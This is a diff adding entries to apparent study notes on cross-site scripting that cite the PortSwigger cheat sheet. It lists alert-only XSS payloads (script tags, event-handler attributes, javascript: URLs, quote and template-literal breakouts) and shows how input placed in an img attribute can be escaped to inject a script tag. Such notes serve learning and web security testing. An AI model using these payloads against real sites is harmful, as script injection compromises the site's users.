@@ -66,3 +66,23 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 - ```<script>alert('xss')</script>```
 - ```<img src='x' onerror="alert('xss')">```
+- ```<img src='x' onload="alert('xss')">```
+- ```<body onload="alert('xss')"/>```
+- ```<iframe src="javascript:alert('xss')">```
+- ```javascript:alert(3)```
+- ```';alert('xss');//```
+- ```<bla onfocus="alert(2)" tabindex="1">spider</bla>```
+- ```var message = `0 search results for '${alert(222)}'`;```
+
+Escape html tags
+
+```html
+<img src="/resources/images/tracker.gif?searchTerms=UserInput">
+```
+
+If you see a tag where user input is being placed into the tag there a chance to escape out of the tag.
+In the example below `UserInput` is being replaced with xss injection `"><script>alert(3)</script>//`
+
+```html
+<img src="/resources/images/tracker.gif?searchTerms="><script>alert(3)</script>//">
+```
